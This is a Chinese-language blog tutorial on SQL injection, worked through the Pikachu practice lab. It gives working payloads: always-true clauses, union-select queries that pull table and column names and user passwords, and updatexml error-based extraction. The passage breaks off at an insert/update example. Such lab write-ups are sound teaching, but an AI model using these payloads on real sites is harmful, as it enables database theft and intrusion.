@@ -1,0 +1,600 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL Inject漏洞 | RJ の 博客</title><meta name="author" content="Rui Ji"><meta name="copyright" content="Rui Ji"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="一．SQL Inject漏洞概述1．原理概述 数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击着可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄漏的一种漏洞。     SQL Injecti漏洞攻击流程:  注入点探测 自动方式：使用web漏洞扫描工具，自动进行注入点发现 手动方式：手工构造sql injecti测试语">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL Inject漏洞">
+<meta property="og:url" content="http://ruijiluo.github.io/2023/12/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="RJ の 博客">
+<meta property="og:description" content="一．SQL Inject漏洞概述1．原理概述 数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击着可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄漏的一种漏洞。     SQL Injecti漏洞攻击流程:  注入点探测 自动方式：使用web漏洞扫描工具，自动进行注入点发现 手动方式：手工构造sql injecti测试语">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/03/01/oVUWrJSki5dLEeX.jpg">
+<meta property="article:published_time" content="2023-12-22T09:32:44.000Z">
+<meta property="article:modified_time" content="2024-12-11T16:04:54.231Z">
+<meta property="article:author" content="Rui Ji">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/03/01/oVUWrJSki5dLEeX.jpg"><link rel="shortcut icon" href="https://s2.loli.net/2023/09/07/hRcHvbPo15QmB7T.png"><link rel="canonical" href="http://ruijiluo.github.io/2023/12/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL Inject漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-12 00:04:54'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="./themes/butterfly/source/css/bg_color.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/03/01/oVUWrJSki5dLEeX.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="RJ の 博客"><span class="site-name">RJ の 博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL Inject漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-22T09:32:44.000Z" title="发表于 2023-12-22 17:32:44">2023-12-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-11T16:04:54.231Z" title="更新于 2024-12-12 00:04:54">2024-12-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL Inject漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><img src="https://s2.loli.net/2023/12/22/UYFqxbORJHo5XZn.png" alt="image-20231222180040516" style="zoom: 63%;" />
+
+<h4 id="一．SQL-Inject漏洞概述"><a href="#一．SQL-Inject漏洞概述" class="headerlink" title="一．SQL Inject漏洞概述"></a>一．SQL Inject漏洞概述</h4><h5 id="1．原理概述"><a href="#1．原理概述" class="headerlink" title="1．原理概述"></a>1．原理概述</h5><ul>
+<li><p>数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击着可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄漏的一种漏洞。</p>
+<img src="https://s2.loli.net/2023/12/22/7qxFTCDY8K5XRSy.png" alt="image-20231222180517210" style="zoom:67%;" />
+
+
+</li>
+<li><p><strong>SQL Injecti漏洞攻击流程:</strong></p>
+<ol>
+<li><strong>注入点探测</strong><ul>
+<li>自动方式：使用web漏洞扫描工具，自动进行注入点发现</li>
+<li>手动方式：手工构造sql injecti测试语句进行注入点发现</li>
+</ul>
+</li>
+<li><strong>信息获取( 通过注入点取期望得到的数据 )</strong><ul>
+<li>环境信息：数据库类型，数据库版本，操作系统版本，用户信息等。</li>
+<li>数据库信息：数据库名称数据库表，表字段，字段内容（加密内容破解</li>
+</ul>
+</li>
+<li><strong>获取权限</strong><ul>
+<li>获取操作系统权限：通过数据库执行shell,上传木马等</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h5 id="2．常见注入点类型"><a href="#2．常见注入点类型" class="headerlink" title="2．常见注入点类型"></a>2．常见注入点类型</h5><ul>
+<li><p><strong>常见注入点类型</strong></p>
+<ul>
+<li><p>数字型	后端代码形如：user_id&#x3D;$id</p>
+</li>
+<li><p>字符型        后端代码形如：user_id&#x3D;’$id’ or ＂$id＂</p>
+</li>
+<li><p>搜索型　　后端代码形如：test LIKE ‘%{$_GET[‘search’]}%’＂</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="二．常见注入点演示-基于pikachu"><a href="#二．常见注入点演示-基于pikachu" class="headerlink" title="二．常见注入点演示(基于pikachu)"></a>二．常见注入点演示(基于pikachu)</h4><h5 id="１-数字型注入-post"><a href="#１-数字型注入-post" class="headerlink" title="１.数字型注入(post)"></a>１.数字型注入(post)</h5><p><img src="https://s2.loli.net/2023/12/22/koUlI982mLivMQG.png" alt="image-20231222201124307"></p>
+<ul>
+<li><p>选择id&#x3D;1后查询</p>
+<p><img src="https://s2.loli.net/2023/12/22/TxLSNeUH1RBf7P9.png" alt="image-20231222201254102"></p>
+</li>
+<li><p>使用BurpSuite抓包，可以发现id为数字型，可以猜测后端sql语句形如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/22/AGXBsozbvld2PEg.png" alt="image-20231222201736065"></p>
+</li>
+<li><p>构建Payload，1 or 1&#x3D;1 ，该payload使where永远为ture，修改id为1 or 1&#x3D;1使用Repeater重发数据包，可查询出表中所有结果</p>
+<img src="https://s2.loli.net/2023/12/22/8zGajeBCnsfiUE3.png" alt="image-20231222202407997" style="zoom:87%;" />
+
+
+</li>
+<li><p>查看后端源码，可以发现后端没有对 $_POST[‘id’] 进行过滤或编译等处理，形成了SQL Injecti漏洞</p>
+<img src="https://s2.loli.net/2023/12/22/5rxAQuo8HRe6hUt.png" alt="image-20231222203104703" style="zoom:73%;" /></li>
+</ul>
+<h5 id="2-字符型注入-get"><a href="#2-字符型注入-get" class="headerlink" title="2.字符型注入(get)"></a>2.字符型注入(get)</h5><p><img src="https://s2.loli.net/2023/12/22/kChenzc4qQ9ujZL.png" alt="image-20231222203431427"></p>
+<ul>
+<li><p>输入kobe,进行测试</p>
+<p><img src="https://s2.loli.net/2023/12/22/uSN5i94KYEenFoL.png" alt="image-20231222203723802"></p>
+</li>
+<li><p>从页面可以猜测$username为字符型，可猜测后端sql语句形如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span>  #使用单引号</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> username<span class="operator">=</span>&quot;$username&quot;  #使用双引号</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>可以输入 kobe’ and 1&#x3D;1#  判断，如果为单引号，就可以输出正确结果(将kobe’# 放入sql语句后为：username&#x3D;’kobe’#’ ，#将后面的单引号注释保证了语法正确)</p>
+</li>
+</ul>
+<p><img src="https://s2.loli.net/2023/12/22/PRzKDMbQAW6pdhl.png" alt="image-20231222205922554"></p>
+<ul>
+<li><p>构建可以形成闭合的，’ or 1&#x3D;1#，该payload使where永远为ture，可查询出表中所有结果</p>
+<p><img src="https://s2.loli.net/2023/12/22/u8ewIF9jU2nNQXV.png" alt="image-20231222210048997"></p>
+</li>
+<li><p>后端源码为</p>
+<img src="https://s2.loli.net/2023/12/22/IfTQERclkOuhsWw.png" alt="image-20231222210259357" style="zoom:73%;" /></li>
+</ul>
+<h5 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h5><p>​                                                                                       <img src="https://s2.loli.net/2023/12/22/UrF1Pl6m7wKjeJI.png" alt="image-20231222212157552"></p>
+<ul>
+<li><p>输入 k 测试</p>
+<p><img src="https://s2.loli.net/2023/12/22/7lMQGwuxJNVa1Ag.png" alt="image-20231222212229031"></p>
+</li>
+<li><p>猜测后端sql语句形如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%$username%&#x27;</span>  #使用单引号</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword">select</span> 字段<span class="number">1</span>，字段<span class="number">2</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> username <span class="keyword">like</span> &quot;%$username%&quot;  #使用双引号</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构建可以形成闭合的Payload，%’ or 1&#x3D;1# 或 %” or 1&#x3D;1#，该payload使where永远为ture，可查询出表中所有结果</p>
+<p><img src="https://s2.loli.net/2023/12/22/gNKVtm3HvF7zk6I.png" alt="image-20231222212737757"></p>
+</li>
+<li><p>后端源码为</p>
+<img src="https://s2.loli.net/2023/12/22/CXkEQ3TmpzuB1Oy.png" alt="image-20231222212828874" style="zoom:67%;" /></li>
+</ul>
+<h5 id="4-xx型注入"><a href="#4-xx型注入" class="headerlink" title="4.xx型注入"></a>4.xx型注入</h5><p><img src="https://s2.loli.net/2023/12/22/6yVMK1OXCbHZYWS.png" alt="image-20231222212940967"></p>
+<ul>
+<li><p>sql注入的关键是构造闭合，使Payload中的语句参与后端sql语句的逻辑运算</p>
+</li>
+<li><p>后端源码为</p>
+<img src="https://s2.loli.net/2023/12/22/YLA46GIqw1mbpaP.png" alt="image-20231222223654118" style="zoom:83%;" />
+
+
+</li>
+<li><p>构造Payload，’)or 1&#x3D;1 # 形成闭合，使where永远为ture，可查询出表中所有结果</p>
+</li>
+</ul>
+<p><img src="https://s2.loli.net/2023/12/22/OeVRUtSrguN5qkF.png" alt="image-20231222223854807"></p>
+<h4 id="三-SQL-Injecti漏洞手工测试"><a href="#三-SQL-Injecti漏洞手工测试" class="headerlink" title="三. SQL Injecti漏洞手工测试"></a>三. SQL Injecti漏洞手工测试</h4><h5 id="1-基于union联合查询的信息获取-以数字型为例"><a href="#1-基于union联合查询的信息获取-以数字型为例" class="headerlink" title="1.基于union联合查询的信息获取(以数字型为例)"></a>1.基于union联合查询的信息获取(以数字型为例)</h5><ul>
+<li><p><strong>union联合查询</strong>：可以通过联合直询来查询指定的数据(将两次查询结果拼接在同一列表显示)</p>
+</li>
+<li><p><strong>用法举例：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span>字段<span class="number">1</span>，字段<span class="number">2</span><span class="keyword">from</span>表名</span><br><span class="line"><span class="comment">-- 联合查询的字段数需要和主查询一致！</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>使用函数获取数据库信息:</strong></p>
+<ul>
+<li><p>获取数据库名称: database();</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前用户的权限: user();</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库版本: version();</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version();</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>信息获取(select)</strong></p>
+<p>​                                                                                                   <img src="https://s2.loli.net/2023/12/23/pZxuLvmc1YzEAD6.png" alt="image-20231223185124762"></p>
+<ul>
+<li><p>判断主查询字段数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用 order by x 通过二分法改变x的值,找到不报错的最大x即为主查询字段数</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库名称</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database();#</span><br></pre></td></tr></table></figure>
+
+<p>​                                                                                      <img src="https://s2.loli.net/2023/12/23/sQrCNq1ThJ4LIm6.png" alt="image-20231223185353926"></p>
+</li>
+<li><p>获取当前用户的权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>();#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/23/tLmEva9dJ5fjUSQ.png" alt="image-20231223185425423"></p>
+</li>
+<li><p>获取数据库版本</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,version();#</span><br></pre></td></tr></table></figure>
+
+<p>​                                                                                      <img src="https://s2.loli.net/2023/12/23/9degQmpFlOiG3Mu.png" alt="image-20231223185518778"></p>
+</li>
+<li><p>基于information_schema获取信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">information_schema数据库表说明:</span><br><span class="line"></span><br><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</span><br><span class="line"></span><br><span class="line">TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</span><br><span class="line"></span><br><span class="line">COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</span><br><span class="line"></span><br><span class="line">STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>获取表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="string">&#x27;union select f,table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/23/AB2IYyEeSxilK9V.png" alt="image-20231223200555863"></p>
+</li>
+<li><p>获取字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="string">&#x27;union select table_name,column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://s2.loli.net/2023/12/23/Ct1dHGXm6R8hDEk.png" alt="image-20231223200617434" style="zoom:93%;" />
+</li>
+<li><p>获取内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="string">&#x27;union select username,password from users#</span></span><br></pre></td></tr></table></figure>
+
+<p>​                                                                              <img src="https://s2.loli.net/2023/12/23/m1NrbKJLYqRIGlg.png" alt="image-20231223200725561"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="2-基于函数报错的的方式来进行利用"><a href="#2-基于函数报错的的方式来进行利用" class="headerlink" title="2.基于函数报错的的方式来进行利用"></a>2.基于函数报错的的方式来进行利用</h5><ul>
+<li><p><strong>技巧思路：</strong>在MYSQL中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息。</p>
+<p>​		   select&#x2F;insert&#x2F;update&#x2F;delete都可以使用报错来获取信息。</p>
+</li>
+<li><p><strong>背景条件：</strong>后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</p>
+</li>
+<li><p><strong>常用的报错函数:</strong></p>
+<ul>
+<li><p>updatexml()</p>
+<p>​	<strong>函数作用：</strong>改变（查找并替换）XML文档中符合条件的节点的值。<br>​	语法：UPDATEXML(xml_document,XPathstring,new_value)<br>​	<strong>第一个参数：</strong>fiedname是String格式，为表中的字段名。<br>​	<strong>第二个参数：</strong>XPathstring(Xpath格式的字符串)，<br>​	<strong>第三个参数：</strong>new_value,String格式，替换查找到的符合条件的</p>
+<p>​	<strong>注: 当XPathstring为函数的返回值时,会先执行函数,如果返回值不合规就将返回值通过报错方式显示到前端!</strong></p>
+</li>
+<li><p>extractvalue()</p>
+<p>​        <strong>函数作用：</strong>从一个使用xpath语法的xml字符串中提取一个值。</p>
+<p>​        <strong>语法：</strong>extractvalue(xml_frag, xpath_expr)</p>
+<p>​        <strong>xml_frag：</strong>xml文档对象的名称，是一个string类型。<br>​        <strong>xpath_expr：</strong>使用xpath语法格式的路径。</p>
+<p>​	<strong>SQL报错注入的应用：</strong>当使用extractvalue(xml_frag, xpath_expr)函数时，若xpath_expr参数不符合xpath格式，就会报错。</p>
+<p>​	而<del>符号(ascii编码值：0x7e)是不存在xpath格式中的， 所以一旦在xpath_expr参数中使用</del>符号，就会产生xpath syntax error (xpath语法	错误)，通过使用这个方法就可以达到报错注入的目的。</p>
+</li>
+<li><p>floor()</p>
+<p>​        <strong>函数作用：</strong>向下取整<br>​        <strong>rand()</strong> 函数，取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测<br>​        <strong>floor( rand( 0 ) * 2 )</strong> 产生的随机序列为011011…<br>​        <strong>SQL报错注入的应用:</strong> 利用数据库表主键不能重复的原理，使用 GROUP BY 分组，产生主键key冗余，导致报错</p>
+</li>
+</ul>
+</li>
+<li><p><strong>select下使用updatexml()报错函数得到username和password</strong></p>
+<p>​                                                                                                       <img src="https://s2.loli.net/2023/12/23/gwstHGV3SxuBZ78.png" alt="image-20231223221044643"></p>
+<ol>
+<li><p>获取数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;and updatexml(1,concat(0x7e,database()),0);#</span></span><br><span class="line"><span class="string">-- 使用concat(0x7e,database())将~和database()组合成字符串,否则显示不全</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/23/Gc2LzHlmS5KE8Fx.png" alt="image-20231223223918486"></p>
+</li>
+<li><p>获取表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),0)#</span></span><br><span class="line"><span class="string">-- 因为报错只能显示一行,使用 limit 0,1 可以指定返回的行号,和行数为 0和1 ,多次使用可得到所有表名</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/23/oEXjz3nCtpeKG8P.png" alt="image-20231223225327910"></p>
+</li>
+<li><p>获取字段名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;</span></span><br><span class="line"><span class="string">limit 0,1)),0)#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/23/O3CJTELoPWUfHFn.png" alt="image-20231223230434276"></p>
+<p><img src="https://s2.loli.net/2023/12/23/X91Yj8uhDp4kKis.png" alt="image-20231223230455040"></p>
+</li>
+<li><p>获取username和password</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</span></span><br><span class="line"><span class="string">kobe&#x27;</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/23/IKZWs1EUtwrXR5k.png" alt="image-20231223231133349"></p>
+<p><img src="https://s2.loli.net/2023/12/23/85SN3gZ4ztKpaDc.png" alt="image-20231223231156723"></p>
+</li>
+</ol>
+</li>
+<li><p><strong>insert&#x2F;update下使用updatexml()报错函数得到信息</strong></p>
+<p>​                                                                                   <img src="https://s2.loli.net/2023/12/24/qMCTwKjVQ8zfWD1.png" alt="image-20231224002307343" style="zoom:80%;" /></p>
+<ul>
+<li><p>insert&#x2F;update操作形如:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">member</span>(username,pw,sex,phonenum,email,address)<span class="keyword">values</span>(<span class="string">&#x27;xxx&#x27;</span>,<span class="number">111111</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">-- xxx为注入点</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造payload</p>
